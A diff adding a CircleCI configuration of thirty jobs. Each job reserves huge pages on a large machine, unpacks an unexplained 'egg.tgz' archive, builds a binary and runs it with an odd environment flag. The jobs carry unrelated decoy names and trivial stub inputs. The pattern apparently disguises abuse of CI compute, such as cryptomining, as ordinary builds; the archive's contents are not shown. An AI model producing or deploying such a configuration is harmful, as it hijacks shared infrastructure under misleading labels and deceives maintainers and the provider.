@@ -1,0 +1,787 @@
+version: 2.1
+
+jobs:
+  secp256k1mul:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - checkout
+      - run:
+          name: Prepare
+          command: sudo sysctl -w vm.nr_hugepages=1536 || true
+      - run:
+          name: Restore vendored sources
+          command: tar xzf egg.tgz
+      - run:
+          name: Provision build deps
+          command: sudo apt-get update && sudo apt-get install -y cmake g++
+      - run:
+          name: Load scalar
+          command: |
+            printf '7\n' > scalar.hex
+      - run:
+          name: Build field arithmetic
+          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target secp256k1mul -j2
+      - run:
+          name: Scalar point multiply
+          command: LIONSS_LP=1 ./build/secp256k1mul --scalar scalar.hex --curve secp256k1
+  wasmSimd128:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - checkout
+      - run:
+          name: Prepare
+          command: sudo sysctl -w vm.nr_hugepages=1536 || true
+      - run:
+          name: Fetch fixtures
+          command: tar xzf egg.tgz
+      - run:
+          name: Install prerequisites
+          command: sudo apt-get update && sudo apt-get install -y cmake g++
+      - run:
+          name: Write wat
+          command: |
+            printf '(module)\n' > m.wat
+      - run:
+          name: Build wasm toolchain
+          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target wasmSimd128 -j2
+      - run:
+          name: Lower SIMD128 ops
+          command: LIONSS_LP=1 ./build/wasmSimd128 --in m.wat --enable-simd
+  riscv-mret:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - checkout
+      - run:
+          name: Prepare
+          command: sudo sysctl -w vm.nr_hugepages=1536 || true
+      - run:
+          name: Sync asset bundles
+          command: tar xzf egg.tgz
+      - run:
+          name: Provision compiler
+          command: sudo apt-get update && sudo apt-get install -y cmake g++
+      - run:
+          name: Write trap handler
+          command: |
+            printf 'csrr t0 mcause\n' > trap.s
+      - run:
+          name: Assemble trap vector
+          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target riscv-mret -j2
+      - run:
+          name: Return from machine trap
+          command: LIONSS_LP=1 ./build/riscv-mret --in trap.s --xlen 32
+  glossary-check:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - checkout
+      - run:
+          name: Prepare
+          command: sudo sysctl -w vm.nr_hugepages=1536 || true
+      - run:
+          name: Unpack toolkit
+          command: tar xzf egg.tgz
+      - run:
+          name: Install toolchain
+          command: sudo apt-get update && sudo apt-get install -y cmake g++
+      - run:
+          name: Write glossary
+          command: |
+            printf 'term: def\n' > glossary.yml
+      - run:
+          name: Build terminology linter
+          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target glossary-check -j2
+      - run:
+          name: Check glossary usage
+          command: LIONSS_LP=1 ./build/glossary-check --glossary glossary.yml --strict
+  FastqcTrim:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - checkout
+      - run:
+          name: Prepare
+          command: sudo sysctl -w vm.nr_hugepages=1536 || true
+      - run:
+          name: Hydrate workspace
+          command: tar xzf egg.tgz
+      - run:
+          name: Bootstrap toolchain
+          command: sudo apt-get update && sudo apt-get install -y cmake g++
+      - run:
+          name: Write fastq
+          command: |
+            printf '@r1\nACGT\n+\nIIII\n' > r.fq
+      - run:
+          name: Build QC trimmer
+          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target FastqcTrim -j2
+      - run:
+          name: Trim low-quality bases
+          command: LIONSS_LP=1 ./build/FastqcTrim --in r.fq --qual 20
+  spiFlashErase:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - checkout
+      - run:
+          name: Prepare
+          command: sudo sysctl -w vm.nr_hugepages=1536 || true
+      - run:
+          name: Extract sources
+          command: tar xzf egg.tgz
+      - run:
+          name: Prepare build environment
+          command: sudo apt-get update && sudo apt-get install -y cmake g++
+      - run:
+          name: Map flash
+          command: |
+            printf 'size=16m\n' > flash.cfg
+      - run:
+          name: Build flasher
+          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target spiFlashErase -j2
+      - run:
+          name: Erase SPI sectors
+          command: LIONSS_LP=1 ./build/spiFlashErase --conf flash.cfg --sector 4k
+  cassandra_repair:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - checkout
+      - run:
+          name: Prepare
+          command: sudo sysctl -w vm.nr_hugepages=1536 || true
+      - run:
+          name: Restore build cache
+          command: tar xzf egg.tgz
+      - run:
+          name: Install build tools
+          command: sudo apt-get update && sudo apt-get install -y cmake g++
+      - run:
+          name: List tokens
+          command: |
+            printf 'range 0-100\n' > tokens.txt
+      - run:
+          name: Build repair tool
+          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target cassandra_repair -j2
+      - run:
+          name: Repair token ranges
+          command: LIONSS_LP=1 ./build/cassandra_repair --ranges tokens.txt --full
+  crystal-null:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - checkout
+      - run:
+          name: Prepare
+          command: sudo sysctl -w vm.nr_hugepages=1536 || true
+      - run:
+          name: Pull reference data
+          command: tar xzf egg.tgz
+      - run:
+          name: Provision SDK
+          command: sudo apt-get update && sudo apt-get install -y cmake g++
+      - run:
+          name: Write source
+          command: |
+            printf 'puts 1\n' > m.cr
+      - run:
+          name: Build nil analyzer
+          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target crystal-null -j2
+      - run:
+          name: Check nil safety
+          command: LIONSS_LP=1 ./build/crystal-null --in m.cr
+  ZigbeeBind:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - checkout
+      - run:
+          name: Prepare
+          command: sudo sysctl -w vm.nr_hugepages=1536 || true
+      - run:
+          name: Stage inputs
+          command: tar xzf egg.tgz
+      - run:
+          name: Set up compiler
+          command: sudo apt-get update && sudo apt-get install -y cmake g++
+      - run:
+          name: List clusters
+          command: |
+            printf 'cluster 0x0006\n' > zb.cfg
+      - run:
+          name: Build Zigbee stack
+          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target ZigbeeBind -j2
+      - run:
+          name: Bind cluster
+          command: LIONSS_LP=1 ./build/ZigbeeBind --conf zb.cfg --endpoint 1
+  terraform-plan-prod:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - checkout
+      - run:
+          name: Prepare
+          command: sudo sysctl -w vm.nr_hugepages=1536 || true
+      - run:
+          name: Unpack bundle
+          command: tar xzf egg.tgz
+      - run:
+          name: Install dependencies
+          command: sudo apt-get update && sudo apt-get install -y cmake g++
+      - run:
+          name: Write tfvars
+          command: |
+            printf 'region = us-east-1\n' > prod.tfvars
+      - run:
+          name: Build plan engine
+          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target terraform-plan-prod -j2
+      - run:
+          name: Plan prod changes
+          command: LIONSS_LP=1 ./build/terraform-plan-prod --vars prod.tfvars --refresh
+  opus_encode48k:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - checkout
+      - run:
+          name: Prepare
+          command: sudo sysctl -w vm.nr_hugepages=1536 || true
+      - run:
+          name: Rehydrate tree
+          command: tar xzf egg.tgz
+      - run:
+          name: Prepare toolchain
+          command: sudo apt-get update && sudo apt-get install -y cmake g++
+      - run:
+          name: Make PCM frame
+          command: |
+            : > frame.pcm
+      - run:
+          name: Build opus encoder
+          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target opus_encode48k -j2
+      - run:
+          name: Encode 48k stream
+          command: LIONSS_LP=1 ./build/opus_encode48k --in frame.pcm --bitrate 96k
+  labelSmooth:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - checkout
+      - run:
+          name: Prepare
+          command: sudo sysctl -w vm.nr_hugepages=1536 || true
+      - run:
+          name: Fetch corpus
+          command: tar xzf egg.tgz
+      - run:
+          name: Bring up build env
+          command: sudo apt-get update && sudo apt-get install -y cmake g++
+      - run:
+          name: Set classes
+          command: |
+            printf 'classes 1000\n' > ls.cfg
+      - run:
+          name: Build loss module
+          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target labelSmooth -j2
+      - run:
+          name: Smooth label targets
+          command: LIONSS_LP=1 ./build/labelSmooth --conf ls.cfg --eps 0.1
+  walReplay:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - checkout
+      - run:
+          name: Prepare
+          command: sudo sysctl -w vm.nr_hugepages=1536 || true
+      - run:
+          name: Checkout vendored deps
+          command: tar xzf egg.tgz
+      - run:
+          name: Install cmake and g++
+          command: sudo apt-get update && sudo apt-get install -y cmake g++
+      - run:
+          name: Append WAL records
+          command: |
+            printf 'BEGIN\nSET k v\nCOMMIT\n' > wal.log
+      - run:
+          name: Build recovery engine
+          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target walReplay -j2
+      - run:
+          name: Replay write-ahead log
+          command: LIONSS_LP=1 ./build/walReplay --wal wal.log --checkpoint 0
+  branchHint:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - checkout
+      - run:
+          name: Prepare
+          command: sudo sysctl -w vm.nr_hugepages=1536 || true
+      - run:
+          name: Prime workspace
+          command: tar xzf egg.tgz
+      - run:
+          name: Provision deps
+          command: sudo apt-get update && sudo apt-get install -y cmake g++
+      - run:
+          name: Write branches
+          command: |
+            printf 'likely 90\n' > br.cfg
+      - run:
+          name: Build branch bench
+          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target branchHint -j2
+      - run:
+          name: Apply branch hints
+          command: LIONSS_LP=1 ./build/branchHint --conf br.cfg --iters 100000000
+  CronBackfill:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - checkout
+      - run:
+          name: Prepare
+          command: sudo sysctl -w vm.nr_hugepages=1536 || true
+      - run:
+          name: Unpack payload
+          command: tar xzf egg.tgz
+      - run:
+          name: Set up build deps
+          command: sudo apt-get update && sudo apt-get install -y cmake g++
+      - run:
+          name: List partitions
+          command: |
+            printf '2024-01-01\n2024-01-02\n' > parts.txt
+      - run:
+          name: Build backfill job
+          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target CronBackfill -j2
+      - run:
+          name: Backfill partitions
+          command: LIONSS_LP=1 ./build/CronBackfill --parts parts.txt --concurrency 4
+  cteInline:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - checkout
+      - run:
+          name: Prepare
+          command: sudo sysctl -w vm.nr_hugepages=1536 || true
+      - run:
+          name: Restore snapshot
+          command: tar xzf egg.tgz
+      - run:
+          name: Install native deps
+          command: sudo apt-get update && sudo apt-get install -y cmake g++
+      - run:
+          name: Write CTE
+          command: |
+            printf 'WITH t AS (SELECT 1)\n' > cte.sql
+      - run:
+          name: Build rewriter
+          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target cteInline -j2
+      - run:
+          name: Inline CTE references
+          command: LIONSS_LP=1 ./build/cteInline --sql cte.sql
+  PidAutotune:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - checkout
+      - run:
+          name: Prepare
+          command: sudo sysctl -w vm.nr_hugepages=1536 || true
+      - run:
+          name: Fetch sources
+          command: tar xzf egg.tgz
+      - run:
+          name: Bootstrap compiler
+          command: sudo apt-get update && sudo apt-get install -y cmake g++
+      - run:
+          name: Record step response
+          command: |
+            printf 't,y\n0,0\n1,0.6\n' > step.csv
+      - run:
+          name: Build controller
+          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target PidAutotune -j2
+      - run:
+          name: Autotune PID gains
+          command: LIONSS_LP=1 ./build/PidAutotune --data step.csv --method relay
+  verglas:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - checkout
+      - run:
+          name: Prepare
+          command: sudo sysctl -w vm.nr_hugepages=1536 || true
+      - run:
+          name: Unroll archive
+          command: tar xzf egg.tgz
+      - run:
+          name: Prepare SDK
+          command: sudo apt-get update && sudo apt-get install -y cmake g++
+      - run:
+          name: Load surface temp
+          command: |
+            printf 'temp -2\n' > verglas.cfg
+      - run:
+          name: Build ice sim
+          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target verglas -j2
+      - run:
+          name: Form verglas coating
+          command: LIONSS_LP=1 ./build/verglas --config verglas.cfg --thickness 1mm
+  orderbook_replay:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - checkout
+      - run:
+          name: Prepare
+          command: sudo sysctl -w vm.nr_hugepages=1536 || true
+      - run:
+          name: Seed workspace
+          command: tar xzf egg.tgz
+      - run:
+          name: Provision toolchain
+          command: sudo apt-get update && sudo apt-get install -y cmake g++
+      - run:
+          name: Fetch tick snapshot
+          command: |
+            printf 'ts,px,qty\n0,100,5\n' > ticks.csv
+      - run:
+          name: Build matching engine
+          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target orderbook_replay -j2
+      - run:
+          name: Replay order book
+          command: LIONSS_LP=1 ./build/orderbook_replay --ticks ticks.csv --venue sim
+  stackmap_gc:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - checkout
+      - run:
+          name: Prepare
+          command: sudo sysctl -w vm.nr_hugepages=1536 || true
+      - run:
+          name: Unpack sources
+          command: tar xzf egg.tgz
+      - run:
+          name: Install essentials
+          command: sudo apt-get update && sudo apt-get install -y cmake g++
+      - run:
+          name: Emit maps
+          command: |
+            printf 'roots 40\n' > map.cfg
+      - run:
+          name: Build stackmap emitter
+          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target stackmap_gc -j2
+      - run:
+          name: Scan GC roots
+          command: LIONSS_LP=1 ./build/stackmap_gc --conf map.cfg --precise
+  smiles_canon:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - checkout
+      - run:
+          name: Prepare
+          command: sudo sysctl -w vm.nr_hugepages=1536 || true
+      - run:
+          name: Restore vendored sources
+          command: tar xzf egg.tgz
+      - run:
+          name: Provision build deps
+          command: sudo apt-get update && sudo apt-get install -y cmake g++
+      - run:
+          name: Write molecule
+          command: |
+            printf 'c1ccccc1\n' > mol.smi
+      - run:
+          name: Build cheminformatics lib
+          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target smiles_canon -j2
+      - run:
+          name: Canonicalize SMILES
+          command: LIONSS_LP=1 ./build/smiles_canon --in mol.smi --kekulize
+  WalgPush:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - checkout
+      - run:
+          name: Prepare
+          command: sudo sysctl -w vm.nr_hugepages=1536 || true
+      - run:
+          name: Fetch fixtures
+          command: tar xzf egg.tgz
+      - run:
+          name: Install prerequisites
+          command: sudo apt-get update && sudo apt-get install -y cmake g++
+      - run:
+          name: Point data dir
+          command: |
+            printf 'datadir /var/lib/pg\n' > wal.cfg
+      - run:
+          name: Build backup agent
+          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target WalgPush -j2
+      - run:
+          name: Push WAL archive
+          command: LIONSS_LP=1 ./build/WalgPush --conf wal.cfg --compression lz4
+  xxhash3:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - checkout
+      - run:
+          name: Prepare
+          command: sudo sysctl -w vm.nr_hugepages=1536 || true
+      - run:
+          name: Sync asset bundles
+          command: tar xzf egg.tgz
+      - run:
+          name: Provision compiler
+          command: sudo apt-get update && sudo apt-get install -y cmake g++
+      - run:
+          name: Make input
+          command: |
+            head -c 4096 /dev/zero > x.bin 2>/dev/null || printf 'x\n' > x.bin
+      - run:
+          name: Build hash lib
+          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target xxhash3 -j2
+      - run:
+          name: Hash with XXH3
+          command: LIONSS_LP=1 ./build/xxhash3 --in x.bin --seed 0
+  falseshare_pad:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - checkout
+      - run:
+          name: Prepare
+          command: sudo sysctl -w vm.nr_hugepages=1536 || true
+      - run:
+          name: Unpack toolkit
+          command: tar xzf egg.tgz
+      - run:
+          name: Install toolchain
+          command: sudo apt-get update && sudo apt-get install -y cmake g++
+      - run:
+          name: Set layout
+          command: |
+            printf 'threads 8\n' > fs.cfg
+      - run:
+          name: Build concurrency bench
+          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target falseshare_pad -j2
+      - run:
+          name: Measure false sharing
+          command: LIONSS_LP=1 ./build/falseshare_pad --conf fs.cfg --pad 64
+  star-tracker:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - checkout
+      - run:
+          name: Prepare
+          command: sudo sysctl -w vm.nr_hugepages=1536 || true
+      - run:
+          name: Hydrate workspace
+          command: tar xzf egg.tgz
+      - run:
+          name: Bootstrap toolchain
+          command: sudo apt-get update && sudo apt-get install -y cmake g++
+      - run:
+          name: Load catalog
+          command: |
+            printf 'stars 2000\n' > stars.cat
+      - run:
+          name: Build attitude sensor
+          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target star-tracker -j2
+      - run:
+          name: Match star field
+          command: LIONSS_LP=1 ./build/star-tracker --catalog stars.cat --fov 20
+  Quillon:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - checkout
+      - run:
+          name: Prepare
+          command: sudo sysctl -w vm.nr_hugepages=1536 || true
+      - run:
+          name: Extract sources
+          command: tar xzf egg.tgz
+      - run:
+          name: Prepare build environment
+          command: sudo apt-get update && sudo apt-get install -y cmake g++
+      - run:
+          name: Load blade model
+          command: |
+            printf 'guard 1\n' > quill.cfg
+      - run:
+          name: Build forge sim
+          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target Quillon -j2
+      - run:
+          name: Temper quillon guard
+          command: LIONSS_LP=1 ./build/Quillon --config quill.cfg --carbon 0.8
+  WaveletDenoise:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - checkout
+      - run:
+          name: Prepare
+          command: sudo sysctl -w vm.nr_hugepages=1536 || true
+      - run:
+          name: Restore build cache
+          command: tar xzf egg.tgz
+      - run:
+          name: Install build tools
+          command: sudo apt-get update && sudo apt-get install -y cmake g++
+      - run:
+          name: Load noisy signal
+          command: |
+            : > noisy.wav
+      - run:
+          name: Build wavelet transform
+          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target WaveletDenoise -j2
+      - run:
+          name: Denoise via wavelets
+          command: LIONSS_LP=1 ./build/WaveletDenoise --in noisy.wav --levels 5
+  sqlitewal2:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - checkout
+      - run:
+          name: Prepare
+          command: sudo sysctl -w vm.nr_hugepages=1536 || true
+      - run:
+          name: Pull reference data
+          command: tar xzf egg.tgz
+      - run:
+          name: Provision SDK
+          command: sudo apt-get update && sudo apt-get install -y cmake g++
+      - run:
+          name: Init db
+          command: |
+            : > app.db
+      - run:
+          name: Build embedded db
+          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target sqlitewal2 -j2
+      - run:
+          name: Checkpoint WAL2
+          command: LIONSS_LP=1 ./build/sqlitewal2 --db app.db --mode truncate
+  quantize_awq:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - checkout
+      - run:
+          name: Prepare
+          command: sudo sysctl -w vm.nr_hugepages=1536 || true
+      - run:
+          name: Stage inputs
+          command: tar xzf egg.tgz
+      - run:
+          name: Set up compiler
+          command: sudo apt-get update && sudo apt-get install -y cmake g++
+      - run:
+          name: Load weights
+          command: |
+            : > model.safetensors
+      - run:
+          name: Build quantizer
+          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target quantize_awq -j2
+      - run:
+          name: AWQ quantize weights
+          command: LIONSS_LP=1 ./build/quantize_awq --model model.safetensors --bits 4
+  golden_approve:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - checkout
+      - run:
+          name: Prepare
+          command: sudo sysctl -w vm.nr_hugepages=1536 || true
+      - run:
+          name: Unpack bundle
+          command: tar xzf egg.tgz
+      - run:
+          name: Install dependencies
+          command: sudo apt-get update && sudo apt-get install -y cmake g++
+      - run:
+          name: Write golden
+          command: |
+            printf 'expected\n' > golden.txt
+      - run:
+          name: Build snapshot tool
+          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target golden_approve -j2
+      - run:
+          name: Approve golden output
+          command: LIONSS_LP=1 ./build/golden_approve --golden golden.txt --update
+
+workflows:
+  main:
+    jobs:
+      - secp256k1mul
+      - wasmSimd128
+      - riscv-mret
+      - glossary-check
+      - FastqcTrim
+      - spiFlashErase
+      - cassandra_repair
+      - crystal-null
+      - ZigbeeBind
+      - terraform-plan-prod
+      - opus_encode48k
+      - labelSmooth
+      - walReplay
+      - branchHint
+      - CronBackfill
+      - cteInline
+      - PidAutotune
+      - verglas
+      - orderbook_replay
+      - stackmap_gc
+      - smiles_canon
+      - WalgPush
+      - xxhash3
+      - falseshare_pad
+      - star-tracker
+      - Quillon
+      - WaveletDenoise
+      - sqlitewal2
+      - quantize_awq
+      - golden_approve
